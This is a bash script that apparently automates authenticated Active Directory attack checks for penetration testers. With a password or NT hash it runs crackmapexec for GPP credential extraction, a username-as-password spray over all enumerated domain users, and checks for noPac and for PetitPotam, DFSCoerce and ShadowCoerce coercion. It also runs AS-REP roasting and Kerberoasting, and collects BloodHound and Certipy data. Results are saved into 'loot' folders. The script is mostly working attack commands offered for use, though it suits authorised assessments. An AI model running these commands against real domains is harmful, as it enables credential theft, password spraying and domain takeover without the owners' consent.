#!/bin/bash

figlet -w 84 ProSecUserChecks
echo "v0.8"

echo "CME is still buggy u need to press ENTER sometimes!"
unset USER HASH PASS DOM IP FQDN BHDOM

show_help() {
  echo "HINT: Special Characters should be escaped better use ''"
  echo "DNS must be working for bloodhound!"
  echo ""
  echo "Options:"
  echo "  -u              Username -> Required"
  echo "  -p              Password -> provide pass OR nthash"
  echo "  -H              NT Hash -> provide pass OR nthash"
  echo "  -d              domain -> required"
  echo "  -i              IP Domain Controller -> required"
  echo "  -h              this help"
  exit 0
}

OPTIND=1
# shellcheck disable=SC2221,SC2222
while getopts u:p:H:d:i: opt; do
  case "$opt" in
    u)
      USER=${OPTARG}
      ;;
    p)
      PASS=${OPTARG}
      ;;
    H)
      HASH=${OPTARG}
      ;;
    d)
      DOM=${OPTARG}
      ;;
    i)
      IP=${OPTARG}
      ;;
    u | p | H | d | i)
      shift 2
      OPTIND=1
      ;;
    *)
      show_help
      ;;
  esac
done

shift "$((OPTIND - 1))"
[ "$1" = "--" ] && shift

if [ -z "$USER" ]; then
  show_help
fi
if [ -z "$IP" ]; then
  show_help
fi
if [ -z "$DOM" ]; then
  show_help
fi

#Check for valide IP
if [[ $IP =~ ^[0-9]+(\.[0-9]+){3}$ ]]; then
  echo "DC IP is: ""$IP"
else
  echo "Wrong IP Format"
  exit 1
fi

# get DC_FQDN
FQDN=$(nslookup "$IP" | awk '// {print$4}' | sed 's/.$//')
# Domain all uppercase for BH query
BHDOM=$(echo "$DOM" | tr '[:lower:]' '[:upper:]')

if [ -z "$HASH" ]; then
  # Use Password
  export PYTHONUNBUFFERED=TRUE
  echo "GPP_Password" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP password
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_password >>/root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt

  awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt | sort -u >/root/output/loot/intern/ad/gpp_password/host.txt
  if [ -s /root/output/loot/intern/ad/gpp_password/host.txt ]; then
    echo "PS-TN-2020-0051 GPP_Password" >>/root/output/loot/intern/findings.txt
    awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt | sort -u >>/root/output/loot/intern/findings.txt
  fi

  echo "GPP_Autologin" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP autologin
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M gpp_autologin >>/root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt

  awk '/Found credentials/ {print$2}' /root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt | sort -u >/root/output/loot/intern/ad/gpp_autologin/host.txt
  if [ -s /root/output/loot/intern/ad/gpp_autologin/host.txt ]; then
    echo "PS-TN-2021-0002 GPP_Autologin" >>/root/output/loot/intern/findings.txt
    awk '/Found credentials in/ {print$2}' /root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt | sort -u >>/root/output/loot/intern/findings.txt
  fi

  echo "username_as_pass" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # User txt from DC
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --users >/root/output/list/raw.txt
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt
  grep '+' /root/output/loot/intern/ad/iam/username/raw_"$DOM".txt >/root/output/loot/intern/ad/iam/username/user_"$DOM".txt
  # keep the raw file for screens and debugging
  # BH owned User
  awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/intern/ad/iam/username/owneduser_"$BHDOM".txt

  for i in $(cat /root/output/loot/intern/ad/iam/username/owneduser_"$BHDOM".txt); do
    echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=true RETURN n;" >>/root/output/loot/intern/ad/iam/username/bh_owned_"$BHDOM".txt
  done

  echo "Pass-Pol" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Password policy
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/passpol/pol_"$DOM".txt

  echo "nopac" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # nopac
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M nopac >>/root/output/loot/intern/ldap/nopac/nopac_"$FQDN".txt

  echo "Petit Potam" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # petitpotam
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/petitpotam_"$FQDN".txt

  echo "DFScoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M dfscoerce >>/root/output/loot/intern/rpc/dfscoerce/dfscoerce_"$FQDN".txt

  echo "Shadowcoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt

  echo "Sessions" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -p "$PASS" -d "$DOM" --sessions >>/root/output/loot/intern/ad/session/sessions_"$DOM".txt

  echo "ntlmv1" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/ntlm_auth/ntlmv1_"$DOM".txt

  echo "ASRep" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # asreproast
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt

  echo "Kerberoast" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # kerberoast
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt

  echo "MAQ" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M MAQ >>/root/output/loot/intern/ad/quota/maq_"$DOM".txt

  echo "LDAP Signing with CME" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  crackmapexec ldap "$FQDN" -u "$USER" -p "$PASS" -d "$DOM" -M ldap-checker >>/root/output/loot/intern/ldap/signing/ldap_check_"$DOM".txt

  echo "LDAP Signing LdapRelayScan" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # ldap signing
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -p "$PASS" -dc-ip "$IP" -method BOTH >>/root/output/loot/intern/ldap/signing/signig_"$DOM".txt

  echo "Bloodhound" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # bloodhound
  bloodhound-python -u "$USER" -p "$PASS" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  echo "Certipy OLD" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # certipy
  certipy find -u "$USER" -p "$PASS" -target "$IP" -old-bloodhound
  mv ./*.zip /root/output/loot/intern/ad

  # Python unbuffered reset to default
  unset PYTHONUNBUFFERED
  echo "Userchecks Done" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
fi

if [ -z "$PASS" ]; then
  # use HASH

  #check for valide NTHASH
  if [ ${#HASH} != 32 ]; then
    echo "Wrong hash Format, just NT HASH"
    exit 1
  else
    echo "Hash looks valide"
  fi

  export PYTHONUNBUFFERED=TRUE
  echo "GPP_Password" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP password
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_password >>/root/output/loot/intern/ad/gpp_password/pass_"$DOM".txt

  echo "GPP_Autologin" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # GPP autologin
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M gpp_autologin >>/root/output/loot/intern/ad/gpp_autologin/login_"$DOM".txt

  echo "username_as_pass" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # User txt from DC
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --users >/root/output/list/raw.txt
  # shellcheck disable=SC1003
  awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
  rm /root/output/list/raw.txt
  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt
  grep '+' /root/output/loot/intern/ad/iam/username/raw_"$DOM".txt >/root/output/loot/intern/ad/iam/username/user_"$DOM".txt
  # keep the raw file for screens and debugging
  # BH owned User
  awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/intern/ad/iam/username/owneduser.txt

  for i in $(cat /root/output/loot/intern/ad/iam/username/owneduser.txt); do
    echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=true RETURN n;" >>/root/output/loot/intern/ad/iam/username/bh_owned.txt
  done

  echo "Pass-Pol" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Password policy
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/passpol/pol_"$DOM".txt

  echo "nopac" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # nopac
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M nopac >>/root/output/loot/intern/ldap/nopac/nopac_"$FQDN".txt

  echo "Petit Potam" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # petitpotam
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M petitpotam >>/root/output/loot/intern/rpc/petit_potam/petitpotam_"$FQDN".txt

  echo "DFScoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M dfscoerce >>/root/output/loot/intern/rpc/dfscoerce/dfscoerce_"$FQDN".txt

  echo "Shadowcoerce" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # DFScoerce
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M shadowcoerce >>/root/output/loot/intern/rpc/shadowcoerce/shadowcoerce_"$FQDN".txt

  echo "Sessions" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  crackmapexec smb /root/output/list/smb_open.txt -u "$USER" -H "$HASH" -d "$DOM" --sessions >>/root/output/loot/intern/ad/session/sessions_"$FQDN".txt

  echo "ntlmv1" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # sessions
  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/ntlm_auth/ntlmv1_"$DOM".txt

  echo "ASRep" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # asreproast
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_"$DOM".txt

  echo "Kerberoast" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # kerberoast
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_"$DOM".txt

  echo "MAQ" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # MAQ
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M MAQ >>/root/output/loot/intern/ad/quota/maq_"$DOM".txt

  echo "LDAP Signing with CME" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # CME Ldap signing
  crackmapexec ldap "$FQDN" -u "$USER" -H "$HASH" -d "$DOM" -M ldap-checker >>/root/output/loot/intern/ldap/signing/ldap_check_"$DOM".txt

  echo "LDAP Signing LdapRelayScan" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # ldap signing
  python3 /opt/LdapRelayScan/LdapRelayScan.py -u "$USER" -nthash "$HASH" -dc-ip "$IP" -method BOTH >/root/output/loot/intern/ldap/signing/signig_"$DOM".txt

  echo "Bloodhound" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # bloodhound
  bloodhound-python -u "$USER" --hashes aad3b435b51404eeaad3b435b51404ee:"$HASH" -d "$DOM" -dc "$FQDN" -w 50 -c all --zip

  echo "Certipy OLD" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
  # Certipy
  certipy find -u "$USER" -hashes "$HASH" -target "$IP" -old-bloodhound
  mv ./*.zip /root/output/loot/intern/ad

  # Python unbuffered reset to default
  unset PYTHONUNBUFFERED
  echo "Userchecks Done" >>/root/output/runtime.txt
  date >>/root/output/runtime.txt
fi
exit 0
